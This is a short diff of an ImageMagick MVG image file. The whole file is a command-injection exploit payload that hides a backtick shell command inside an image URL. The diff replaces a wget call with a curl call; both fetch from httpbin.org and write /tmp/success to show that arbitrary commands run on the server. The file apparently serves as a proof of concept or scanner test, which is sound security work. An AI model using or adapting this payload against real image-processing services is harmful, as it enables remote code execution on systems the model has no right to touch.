@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- http://httpbin.org/get > /tmp/success`'
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`curl http://httpbin.org/get > /tmp/success`'
 pop graphic-context
